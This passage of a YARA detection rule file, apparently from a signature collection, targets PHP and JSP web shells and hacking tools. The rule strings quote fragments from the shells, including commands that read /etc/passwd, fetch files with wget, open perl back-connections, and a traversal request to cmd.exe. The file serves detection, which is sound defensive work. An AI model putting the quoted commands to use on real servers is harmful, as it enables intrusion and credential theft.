      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$link=pg_connect(\"host=$host dbname=$db user=$user password=$pass\");" fullword
      $s6 = "while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|" 
      $s9 = "while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+" 
   condition: 
      2 of them
} 

rule Webshell_Shell_Biz_c100_RID2F75 : DEMO T1087 T1100 T1105 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files Shell [ci] .Biz was here.php, c100 v. 777shell v. Undetectable #18a Modded by 777 - Don.php, c99-shadows-mod.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:58:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1087, T1100, T1105, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "if ($data{0} == \"\\x99\" and $data{1} == \"\\x01\") {return \"Error: \".$stri" 
      $s3 = "<OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\"" 
      $s4 = "<OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CPUINFO" fullword
      $s7 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/de" 
      $s9 = "<OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">USER" 
   condition: 
      2 of them
} 

rule Webshell_NIX_REMOTE_WEB_SHELL_RID30D4 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type=" 
      $s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
      $s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
      $s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
   condition: 
      2 of them
} 

rule Webshell_C99_w4cking_Shell_RID30C8 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "echo \"<b>HEXDUMP:</b><nobr>" 
      $s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
      $s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r" 
      $s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB " 
      $s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
      $s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>" 
   condition: 
      2 of them
} 

rule Webshell_phpspy_2006_arabicspy_RID328E : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "$this -> addFile($content, $filename);" fullword
      $s3 = "function addFile($data, $name, $time = 0) {" fullword
      $s8 = "function unix2DosTime($unixtime = 0) {" fullword
      $s9 = "foreach($filelist as $filename){" fullword
   condition: 
      all of them
} 

rule Webshell_c99_c99shell_RID2EC7 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:29:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv" 
      $s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
      $s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66" 
      $s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources" 
      $s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos" 
      $s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!" 
   condition: 
      2 of them
} 

rule Webshell_ok_style_1_JspSpy_RID3168 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files he1p.jsp, JspSpy.jsp, nogfw.jsp, ok.jsp, style.jsp, 1.jsp, JspSpy.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:21:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "\"\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>\"+" fullword
      $s4 = "out.println(\"<h2>File Manager - Current disk &quot;\"+(cr.indexOf(\"/\") == 0?" 
      $s7 = "String execute = f.canExecute() ? \"checked=\\\"checked\\\"\" : \"\";" fullword
      $s8 = "\"<td nowrap>\"+f.canRead()+\" / \"+f.canWrite()+\" / \"+f.canExecute()+\"</td>" 
   condition: 
      2 of them
} 

rule Webshell_queryDong_spyjsp2010_zend_RID343F : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "return new Double(format.format(value)).doubleValue();" fullword
      $s5 = "File tempF = new File(savePath);" fullword
      $s9 = "if (tempF.isDirectory()) {" fullword
   condition: 
      2 of them
} 

rule Webshell_r57shell_antichat_RID3147 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:15:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d" 
      $s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
      $s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
      $s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
   condition: 
      2 of them
} 

rule Webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx_RID360A : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:38:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "BODY, TD, TR {" fullword
      $s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
      $s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
   condition: 
      2 of them
} 

rule Webshell_css_dm_he1p_xxx_RID30B3 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "String savePath = request.getParameter(\"savepath\");" fullword
      $s4 = "URL downUrl = new URL(downFileUrl);" fullword
      $s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
      $s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
      $s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
      $s8 = "URLConnection conn = downUrl.openConnection();" fullword
      $s9 = "sis = request.getInputStream();" fullword
   condition: 
      4 of them
} 

rule Webshell_JSP_icesword_RID2F52 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:52:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
      $s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
      $s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
   condition: 
      2 of them
} 

rule Webshell_JFolder_JSP_2_RID2F29 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:45:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol" 
      $s2 = " KB </td>" fullword
      $s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\"" 
      $s4 = "<!-- <tr align=\"center\"> " fullword
   condition: 
      all of them
} 

rule Webshell_phpspy_2006_PHPSPY_RID30B4 : DEMO T1086 T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1086, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "http://www.4ngel.net" fullword
      $s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
      $s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
      $s9 = "Codz by Angel" fullword
   condition: 
      2 of them
} 

rule Webshell_browser_201_3_ma_ma2_download_RID3571 : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:13:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
      $s2 = "private static String tempdir = \".\";" fullword
      $s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\"" 
   condition: 
      2 of them
} 

rule Webshell_000_403_c5_queryDong_spyjsp2010_RID350B : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:56:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val" 
      $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa" 
      $s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName(" 
      $s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
   condition: 
      2 of them
} 

rule Webshell_r57shell127_r57_kartal_r57_RID338E : DEMO T1100 T1136 WEBSHELL {
   meta:
      description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:52:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, T1100, T1136, WEBSHELL"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
      $s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
      $s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_" 
   condition: 
      2 of them
} 

rule HKTL_Fierce2_RID2B23 : DEMO HKTL T1136 {
   meta:
      description = "This signature detects the Fierce2 domain scanner"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 08:53:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "$tt_xml->process( 'end_domainscan.tt', $end_domainscan_vars," 
   condition: 
      1 of them
} 

rule HKTL_Ncrack_RID2AF5 : DEMO HKTL T1110 T1136 {
   meta:
      description = "This signature detects the Ncrack brute force tool"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 09:40:01"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1110, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "NcrackOutputTable only supports adding up to 4096 to a cell via" 
   condition: 
      1 of them
} 

rule HKTL_SQLMap_RID2AB1 : DEMO HKTL T1136 {
   meta:
      description = "This signature detects the SQLMap SQL injection tool"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 07:46:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "except SqlmapBaseException, ex:" 
   condition: 
      1 of them
} 

rule HKTL_PortScanner_RID2D12 : DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file PortScanner.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 10:16:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Scan Ports Every" 
      $s3 = "Scan All Possible Ports!" 
   condition: 
      all of them
} 

rule HKTL_MooreR_Port_Scanner_RID3024 : DEMO HKTL T1046 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file MooreR Port Scanner.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 12:27:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1046, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Description|" 
      $s3 = "soft Visual Studio\\VB9yp" 
      $s4 = "adj_fptan?4" 
      $s7 = "DOWS\\SyMem32\\/o" 
   condition: 
      all of them
} 

rule HKTL_NetBIOS_Name_Scanner_RID3000 : DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file NetBIOS Name Scanner.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 12:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "IconEx" 
      $s2 = "soft Visual Stu" 
      $s4 = "NBTScanner!y&" 
   condition: 
      all of them
} 

rule HKTL_FeliksPack3___Scanners_ipscan_RID33EA : DEMO HKTL T1086 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file ipscan.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 15:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1086, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s2 = "WCAP;}ECTED" 
      $s4 = "NotSupported" 
      $s6 = "SCAN.VERSION{_" 
   condition: 
      all of them
} 

rule HKTL_CGISscan_CGIScan_RID2E25 : DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file CGIScan.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 11:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Wang Products" fullword wide
      $s2 = "WSocketResolveHost: Cannot convert host address '%s'" 
      $s3 = "tcp is the only protocol supported thru socks server" 
   condition: 
      all of ( $s* )
} 

rule HKTL_IP_Stealing_Utilities_RID30ED : DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file IP Stealing Utilities.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 13:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "DarkKnight" 
      $s9 = "IPStealerUtilities" 
   condition: 
      all of them
} 

rule HKTL_PortRacer_RID2C35 : DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file PortRacer.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 09:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s0 = "Auto Scroll BOTH Text Boxes" 
      $s4 = "Start/Stop Portscanning" 
      $s6 = "Auto Save LogFile by pressing STOP" 
   condition: 
      all of them
} 

rule HKTL_scanarator_RID2CD1 : DEMO HKTL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule on file scanarator.exe"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-07 10:05:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, HKTL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s4 = "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 
   condition: 
      all of them
} 
